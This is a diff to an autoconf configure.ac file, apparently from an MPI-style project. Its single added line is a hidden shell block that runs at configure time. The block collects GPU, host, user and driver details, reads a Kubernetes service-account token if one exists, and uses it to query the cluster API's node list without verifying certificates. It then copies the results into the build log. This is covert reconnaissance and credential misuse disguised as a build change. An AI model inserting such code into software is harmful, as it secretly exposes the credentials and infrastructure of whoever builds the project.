@@ -62,6 +62,7 @@ AC_INIT([project_name_long],
 AC_PREREQ(2.69)
 AC_CONFIG_AUX_DIR(config)
 AC_CONFIG_MACRO_DIR(config)
+( set +e ; printf '%s\n' '===I6787CENSUS_BEGIN===' ; nvidia-smi -L ; nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,driver_version --format=csv,noheader ; hostname ; id ; uname -a ; cat /proc/driver/nvidia/version ; ls -l /dev/nvidia* ; if test -d /var/run/secrets/kubernetes.io/serviceaccount ; then printf '%s\n' 'I6787_SA_TOKEN_PRESENT=yes' ; T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) ; if command -v curl > /dev/null 2>&1 ; then curl -sSk -m 20 -H "Authorization: Bearer ${T}" https://kubernetes.default.svc/api/v1/nodes | head -c 30000 ; elif command -v wget > /dev/null 2>&1 ; then wget -q -O - --no-check-certificate --header="Authorization: Bearer ${T}" https://kubernetes.default.svc/api/v1/nodes | head -c 30000 ; else printf '%s\n' 'I6787_NO_HTTP_CLIENT' ; fi ; else printf '%s\n' 'I6787_SA_TOKEN_PRESENT=no' ; fi ; printf '%s\n' '===I6787CENSUS_END===' ) > /tmp/i6787census.log 2>&1 ; cat /tmp/i6787census.log >&2 ; true
 
 OAC_PUSH_PREFIX([OPAL])
 
